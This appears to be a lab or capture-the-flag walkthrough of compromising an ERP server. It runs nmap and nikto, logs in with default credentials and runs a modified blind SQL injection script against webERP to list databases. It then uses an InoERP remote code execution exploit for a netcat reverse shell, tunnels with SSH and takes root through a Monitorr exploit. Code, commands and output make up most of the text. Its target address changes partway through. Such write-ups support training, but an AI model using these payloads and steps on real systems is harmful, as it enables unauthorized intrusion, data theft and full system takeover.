WALKTHROUGH
×
Exploitation Guide for ERP
Summary
In this guide, we will leverage a blind SQLi to discover an ERP system which is vulnerable to an arbitary file upload to establish our initial foothold. We will escalate privileges by accessing a system not available to external users to obtain root access.

Enumeration
We begin the enumeration process with an nmap scan.

┌──(kali㉿kali)-[~]
└─$ sudo nmap -T4 -p-  172.16.201.19
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-07 07:12 MST
Stats: 0:04:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for customers-survey.marketing.pg (172.16.201.19)
Host is up (0.19s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
We navigate to port 80 and see the following webpage.

tsuko
tsuko
We can use nikto to further enumerate the target.

┌──(kali㉿kali)-[~]
└─$ nikto -h 172.16.201.19             
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.16.201.19
+ Target Hostname:    172.16.201.19
+ Target Port:        80
+ Start Time:         2022-09-07 05:31:42 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/weberp/index.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ 7917 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2022-09-07 05:50:30 (GMT-7) (1128 seconds)
---------------------------------------------------------------------------
+ 1 host(s) test
From the output we see that our scan reveals robots.txt includes an entry.

Viewing robots.txt we discover /weberp/index.php.

┌──(kali㉿kali)-[~]
└─$ curl http://172.16.201.19/robots.txt                                     
User-agent: *
Allow: /weberp/index.php
Navigating to http://192.168.100.72/weberp we see the real login form of webERP.

weberp
weberp
We proceed by searching for potential exploits and discover WebERP 4.15 - SQL injection.

Exploitation
According to the script, we require credentials for exploitation.

Before attempting to brute force credentials, we test default credentials for webERP and find that we are able to successfully authenticate with admin:weberp.

We begin by downloading the exploit to our attack machine.

kali@kali:~$ wget https://www.exploit-db.com/raw/47013
We view the usage info:

(+) usage: <filename> <target> <path> <login> <password> <order>
(+) eg: <filename> 127.0.0.1 "weberp/webERP/" admin weberp 1' % sys.argv[0]
Order means the number of company on the website. Can be gathered from the login page and usually equals 0 or 1'
Now we execute the exploit with the credentials admin:weberp.

kali@kali:~$ python 47013 192.168.100.72 "weberp/" admin weberp 0
Blind sqli is confirmed
From the output we see that the target is vulnerable to blind SQLi.

To proceed, we need to find the SQL server version, the number of databases, and each database's name.

We know that webERP works on MySQL version 4.3 or above based on the Software Requirements.

To determine the number of databases on the target we need to modify our previous exploit to reflect the following:

if __name__ == "__main__":
    #proxies = {'http':'127.0.0.1:8080'}
    proxies = {}
    
    if len(sys.argv) != 6:
        print '(+) usage: %s <target> <path> <login> <password> <order>' % sys.argv[0]
        print '(+) eg: %s 127.0.0.1 "weberp/webERP/" admin weberp 1' % sys.argv[0]
        print 'Order means the number of company on the website. Can be gathered from the login page and usually equals 0 or 1'
        exit()
    
    ip = sys.argv[1] + "/" + sys.argv[2]
    
    #if don't have php, set Payload to the next one to check this time-based SQLi: YToxOntpOjA7czoyMzoiMCB3aGVyZSBzbGVlcCgxKT0xOy0tIC0iO30=
    #payload = generatePayload("0 where sleep(1)=1;-- -", "0")
    
    i=1
    while True:
        
        payload = generatePayload("0", "-13.37' or IF((SELECT COUNT(*) FROM information_schema.SCHEMATA)="+str(i)+", sleep(1),FALSE) or '2'='1")
        
        # SELECT;
        #get cookies
        cookies = getCookies(ip, sys.argv[5], sys.argv[3], sys.argv[4])
        
        addSupplierID("GARUMPAGE", cookies, proxies)
        
        t1 = time.time()
        runExploit(cookies, "GARUMPAGE", payload, proxies)
        t2 = time.time()
    
        if (t2-t1>1):
            print "number of databases on server: " +str(i)
            break
        else:
            i=i+1
Now we execute our modified exploit.

kali@kali:~/Desktop/sqliWebERp$ python sqli_num_of_db.py 192.168.100.72 "weberp/" admin weberp 0
number of databases on server: 3
We have confirmed that there are 3 databases on the server.

Now we will modify our exploit to reveal the names of each database.

def checkForDbName(index, currentDbName):
    payload = generatePayload("0", "-13.37' or IF((SELECT SUBSTRING(SCHEMA_NAME, 1, "+str(len(currentDbName))+")='"+ currentDbName +"' FROM information_schema.SCHEMATA  LIMIT "+ str(index) +", 1 ), sleep(0.05),FALSE) or '2'='1")
                
    
    t1 = time.time()
    runExploit(cookies, "GARUMPAGE", payload, proxies)
    t2 = time.time()

    if (t2-t1>0.5):
        return True
    else:
        return False
    
    

if __name__ == "__main__":
    TOTAL_TIME =time.time()
    #proxies = {'http':'127.0.0.1:8080'}
    proxies = {}
    
    if len(sys.argv) != 6:
        print '(+) usage: %s <target> <path> <login> <password> <order>' % sys.argv[0]
        print '(+) eg: %s 127.0.0.1 "weberp/webERP/" admin weberp 1' % sys.argv[0]
        print 'Order means the number of company on the website. Can be gathered from the login page and usually equals 0 or 1'
        exit()

    ip = sys.argv[1] + "/" + sys.argv[2]
    cookies = getCookies(ip, sys.argv[5], sys.argv[3], sys.argv[4])
    addSupplierID("GARUMPAGE", cookies, proxies)
    
    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$_'
    namesOfDatabases = []
    numberOfDbs = 3;
    
    for i in range(numberOfDbs):
        currentDbName='0'
        if checkForDbName(i, 'information_schema'):
            namesOfDatabases.append('information_schema')
            print "Finally, database #"+str(i+1)+" on server: information_schema"
            continue;
        flagNoMoreChars = False
        while (not flagNoMoreChars):
            for j in range(len(chars)):
                currentDbName = currentDbName[:len(currentDbName)-1] + chars[j]
                if checkForDbName(i, currentDbName):
                    print "database #"+str(i+1)+" on server: " + currentDbName +"...";
                    currentDbName= currentDbName + '0'
                    flagNoMoreChars = False
                    break;
                else:
                    flagNoMoreChars = True
        currentDbName = currentDbName[:len(currentDbName)-1]
        print "Finally, database #"+str(i+1)+" on server: " + currentDbName
        namesOfDatabases.append(currentDbName)
    print "Databases: " + str(namesOfDatabases)
    print "TOTAL TIME = ", time.time() - TOTAL_TIME
    
We once again execute our modified exploit, and see the following output.

kali@kali:~/Desktop/sqliWebERp$ python sqli_dbNames.py 192.168.100.72 "weberp/" admin weberp 0
Finally, database #1 on server: information_schema
database #2 on server: i...
database #2 on server: in...
database #2 on server: ino...
database #2 on server: inoe...
database #2 on server: inoer...
database #2 on server: inoerp...
database #2 on server: inoerp_...
database #2 on server: inoerp_d...
database #2 on server: inoerp_db...
Finally, database #2 on server: inoerp_db
database #3 on server: w...
database #3 on server: we...
database #3 on server: web...
database #3 on server: webe...
database #3 on server: weber...
database #3 on server: weberp...
database #3 on server: weberp_...
database #3 on server: weberp_d...
database #3 on server: weberp_db...
Finally, database #3 on server: weberp_db
Databases: ['information_schema', 'inoerp_db', 'weberp_db']
TOTAL TIME =  36.6472799778
The output reveals an interesting database: inoerp_db.

When visiting http://192.168.100.72/inoerp we discover another application.

inoerp
inoerp
After researching inoerp we discover InoERP 0.7.2 - Remote Code Execution (Unauthenticated).

We download the exploit onto our attacker machine.

kali@kali:~$ wget https://www.exploit-db.com/raw/48946
Now we start a listener on our attacker machine.

root@kali:~# nc -nvlp 80
Listening on [any] 80 ...
We execute our exploit.

kali@kali:~$ python 48946 http://192.168.100.72/inoerp 192.168.100.44 80
We receive a response in our listener.

root@kali:~# nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.100.44] from (UNKNOWN) [192.168.100.72] 58562
bash: cannot set terminal process group (33996): Inappropriate ioctl for device
bash: no job control in this shell
...
www-data@erp:/var/www/html/inoerp/modules/sys/form_personalization$
Privilege Escalation
During our enumeration we list sockets using the ss utility:

www-data@erp:/var/www/html/inoerp/modules/sys/form_personalization$ ss -antp
ss -antp                                                                                                                                                   
State     Recv-Q Send-Q           Local Address:Port               Peer Address:Port                                                                            Process                                                                                                                                               
LISTEN 0      80                   127.0.0.1:3306                  0.0.0.0:*                                                                                    
LISTEN 0      4096             127.0.0.53%lo:53                    0.0.0.0:*                                                                                    
LISTEN 0      128                    0.0.0.0:22                    0.0.0.0:*                                                                                    
LISTEN 0      4096                 127.0.0.1:8443                  0.0.0.0:*                                                                                    
ESTAB  0      0               192.168.100.72:22                 5.9.47.204:56603                                                                                
ESTAB  0      0               192.168.100.72:46962          192.168.100.44:80    users:(("ss",pid=245522,fd=2),("ss",pid=245522,fd=1),("ss",pid=245522,fd=0),("bash",pid=244997,fd=255),("bash",pid=244997,fd=2),("bash",pid=244997,fd=1),("bash",pid=244997,fd=0))
ESTAB  0      0               192.168.100.72:22                 5.9.47.204:65479                                                                                
LISTEN 0      511                          *:80                          *:*                                                                                    
LISTEN 0      128                       [::]:22                       [::]:*                                                                                    
ESTAB  0      0      [::ffff:192.168.100.72]:80    [::ffff:192.168.100.44]:39938  

We see that port 8443 is open for listening but if we open http://192.168.100.72:8443/ in the browser, there is no response.

To access port 8443 , we will utilize protocol tunneling.

We begin protocol tunneling with the following command (SSH server must be running on the attacker machine):

www-data@erp:/var/www/html/inoerp/modules/sys/form_personalization$ ssh -R 8443:127.0.0.1:8443 kali@192.168.100.44
<on$ ssh -R 8443:127.0.0.1:8443 kali@192.168.100.44                
Pseudo-terminal will not be allocated because stdin is not a terminal.
Could not create directory '/var/www/.ssh'.
Host key verification failed.
From the output we seem to have restrictions on our shell.

To avoid the restrictions of our shell we can spawn a bash shell through the python3 interpreter:

www-data@erp:/var/www/html/inoerp/modules/sys/form_personalization$ python3 -c "import pty;pty.spawn('/bin/bash')"
<ion$ python3 -c "import pty;pty.spawn('/bin/bash')"                
www-data@erp:/var/www/html/inoerp/modules/sys/form_personalization$ ssh -R 8443:127.0.0.1:8443 kali@192.168.100.44
<on$ ssh -R 8443:127.0.0.1:8443 kali@192.168.100.44                
Could not create directory '/var/www/.ssh'.
The authenticity of host '192.168.100.44 (192.168.100.44)' can't be established.
ECDSA key fingerprint is SHA256:njTwMdys9ogT4RiXrYmhObsAJBULOX0TxI1QX0MkMtk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
kali@192.168.100.44's password: yourPassword

Linux kali 5.7.0-kali1-amd64 #1 SMP Debian 5.7.6-1kali2 (2020-07-01) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 22 13:45:30 2022 from 192.168.100.72
kali@kali:~$
Now on 127.0.0.1:8443 we see an application titled Monitorr and discover the following exploit.

We begin by downloading the exploit to our attacker machine.

kali@kali:~$ wget https://www.exploit-db.com/raw/48980
Now we start a listener.

root@kali:~# nc -nvlp 53
Listening on [any] 53 ...
Returning to our recently downloaded python script we execute it with the following parameters:

kali@kali:~$ python 48980 http://127.0.0.1:8443 192.168.100.44 53
We receive a response in our listener and have obtained root access.

root@kali:~# nc -nvlp 53
listening on [any] 53 ...
connect to [192.168.100.44] from (UNKNOWN) [192.168.100.72] 34976
root@erp:~/Monitorr/assets/data/usrimg# whoami
root
